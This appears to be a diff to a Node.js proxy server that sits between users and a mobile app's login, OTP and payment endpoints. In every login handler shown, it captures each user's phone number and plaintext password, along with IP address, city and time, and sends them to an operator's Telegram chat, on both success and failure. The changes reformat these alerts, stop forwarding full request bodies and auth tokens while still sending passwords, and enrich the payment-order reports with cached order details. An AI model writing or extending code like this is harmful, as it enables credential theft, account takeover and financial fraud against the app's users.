@@ -1845,21 +1845,34 @@ app.post('/app/user/login/login', async (req, res) => {
 
     if (data.adminChatId && bot) {
       const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
-      const reqStr = JSON.stringify(body, null, 2);
-      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
-      let extraInfo = '';
-      const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
-      if (loginData && loginData.challengeId) {
-        extraInfo = `\n\n🎯 DEVICE VERIFICATION NEEDED!\n📋 challengeId: ${loginData.challengeId}\n📱 Android ID: ${androidId}`;
+      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
+      const city = req.headers['x-vercel-ip-city'] || 'N/A';
+      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+      if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
+        let msg =
+          `🔑 *Login Attempt (Credentials Received)*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
+          `🔒 *Password:* \`${pwd}\`\n`;
+        if (userId) msg += `👤 *UserID:* \`${userId}\`\n`;
+        msg +=
+          `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
+          `🕐 *Time:* ${time}`;
+
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+      } else {
+        const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
+        let msg =
+          `❌ *Login Attempt Failed*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
+          `🔒 *Password:* \`${pwd}\`\n` +
+          `⚠️ *Reason:* ${errorMsg}\n` +
+          `🕐 *Time:* ${time}`;
+
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       }
-      const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
-      if (loginToken && jsonResp?.code === 1000) {
-        extraInfo += `\n\n🔑 AUTH TOKEN:\n${loginToken}`;
-      }
-      if (loginData && loginData.challengeId) {
-        extraInfo += `\n\n📋 COPY:\nchallengeId: ${loginData.challengeId}\ndeviceId: ${androidId}`;
-      }
-      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n📱 Android ID: ${androidId}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE:\n${resStr.substring(0, 1500)}${extraInfo}\n\n✅ OTP sent successfully`).catch(() => { });
     }
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch (e) { await transparentProxy(req, res); }
@@ -1873,27 +1886,31 @@ app.post('/app/user/login/sendotp', async (req, res) => {
     if (data.adminChatId && bot) {
       const phone = body.userName || body.phone || body.mobile || 'N/A';
       const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
-      const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
-      const reqStr = JSON.stringify(body, null, 2);
-      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
+      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
+      const city = req.headers['x-vercel-ip-city'] || 'N/A';
+      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
       if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
         let msg =
-          `🔑 Login / Send OTP\n` +
-          `📱 Phone: ${phone}\n` +
-          `🔒 Password: ${pwd}\n` +
-          `📱 Android ID: ${androidId}\n` +
-          `🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n` +
-          `📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n` +
-          `🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n` +
-          `📤 REQUEST BODY:\n${reqStr.substring(0, 1000)}\n\n` +
-          `📥 RESPONSE:\n${resStr.substring(0, 1000)}\n\n` +
-          `✅ OTP sent successfully`;
+          `📲 *OTP Sent Successfully*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📱 *Phone:* \`${phone}\`\n` +
+          `🔒 *Password:* \`${pwd}\`\n` +
+          `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
+          `🕐 *Time:* ${time}`;
 
-        bot.sendMessage(data.adminChatId, msg).catch(() => { });
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       } else {
-        const msg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
-        bot.sendMessage(data.adminChatId, `❌ OTP Failed for ${phone}\n🔒 Password: ${pwd}\nReason: ${msg}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(() => { });
+        const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
+        let msg =
+          `❌ *OTP Sending Failed*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📱 *Phone:* \`${phone}\`\n` +
+          `🔒 *Password:* \`${pwd}\`\n` +
+          `⚠️ *Reason:* ${errorMsg}\n` +
+          `🕐 *Time:* ${time}`;
+
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       }
     }
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
@@ -1927,23 +1944,19 @@ app.post('/app/user/login/start', async (req, res) => {
     if (data.adminChatId && bot) {
       const phone = body.userName || body.phone || body.mobile || 'N/A';
       const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
-      const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
-      const reqStr = JSON.stringify(body, null, 2);
-      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
+      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
+      const city = req.headers['x-vercel-ip-city'] || 'N/A';
+      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
       let msg =
-        `🔑 Login Start / OTP Sent\n` +
-        `📱 Phone: ${phone}\n` +
-        `🔒 Password: ${pwd}\n` +
-        `📱 Android ID: ${androidId}\n` +
-        `🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n` +
-        `📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n` +
-        `🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n` +
-        `📤 REQUEST BODY:\n${reqStr.substring(0, 1000)}\n\n` +
-        `📥 RESPONSE:\n${resStr.substring(0, 1000)}\n\n` +
-        `✅ OTP sent successfully`;
+        `🔑 *Login Attempt (Credentials Received)*\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `📱 *Phone:* \`${phone}\`\n` +
+        `🔒 *Password:* \`${pwd}\`\n` +
+        `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
+        `🕐 *Time:* ${time}`;
 
-      bot.sendMessage(data.adminChatId, msg).catch(() => { });
+      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
     }
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch (e) { await transparentProxy(req, res); }
@@ -2000,33 +2013,30 @@ app.post('/app/user/login/confirm', async (req, res) => {
 
     if (data.adminChatId && bot) {
       const pwd = body.password || body.pwd || body.loginPwd || body.pin || 'N/A';
-      const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
       const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
       const city = req.headers['x-vercel-ip-city'] || 'N/A';
       const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
-      if (jsonResp && jsonResp.code === 1000) {
-        const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
-        let msg = `✅ *Successful Login*\n\n`;
-        msg += `📱 *Phone:* \`${phone || 'N/A'}\`\n`;
-        msg += `🔒 *Password:* \`${pwd}\`\n`;
-        msg += `👤 *UserID:* \`${userId || 'N/A'}\`\n`;
-        msg += `📱 *Android ID:* \`${androidId}\`\n`;
-        msg += `🌐 *IP:* ${ip} (${city})\n`;
-        msg += `🕐 *Time:* ${time}\n`;
-        if (loginToken) msg += `\n🔑 *Auth Token:*\n\`${loginToken}\``;
-        if (loginData && loginData.challengeId) msg += `\n\n🎯 *Device Verification Required*\n📋 challengeId: \`${loginData.challengeId}\``;
+      if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
+        let msg =
+          `✅ *Login Successful*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `👤 *UserID:* \`${userId || 'N/A'}\`\n` +
+          `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
+          `🔒 *Password:* \`${pwd}\`\n` +
+          `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
+          `🕐 *Time:* ${time}`;
 
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       } else {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
-        let msg = `❌ *Login Failed*\n\n`;
-        msg += `📱 *Phone:* \`${phone || 'N/A'}\`\n`;
-        msg += `🔒 *Password:* \`${pwd}\`\n`;
-        msg += `📱 *Android ID:* \`${androidId}\`\n`;
-        msg += `🌐 *IP:* ${ip} (${city})\n`;
-        msg += `🕐 *Time:* ${time}\n`;
-        msg += `\n⚠️ *Reason:* ${errorMsg}`;
+        let msg =
+          `❌ *Login Failed*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
+          `🔒 *Password:* \`${pwd}\`\n` +
+          `⚠️ *Reason:* ${errorMsg}\n` +
+          `🕐 *Time:* ${time}`;
 
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       }
@@ -2481,8 +2491,9 @@ app.post('/app/payment/order/create', async (req, res) => {
 
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const phone = getPhone(data, userId);
-      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || req.query?.amount || req.query?.buyAmount || 0) || 0;
-      const orderCode = body.code || body.orderCode || body.buyCode || '';
+      const cachedInfo = targetPayOrderId ? orderCache.get(targetPayOrderId) : null;
+      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || req.query?.amount || req.query?.buyAmount || (cachedInfo ? cachedInfo.amount : 0) || 0) || 0;
+      const orderCode = body.code || body.orderCode || body.buyCode || (cachedInfo ? cachedInfo.code : '') || '';
 
       if (!isSuccess) {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
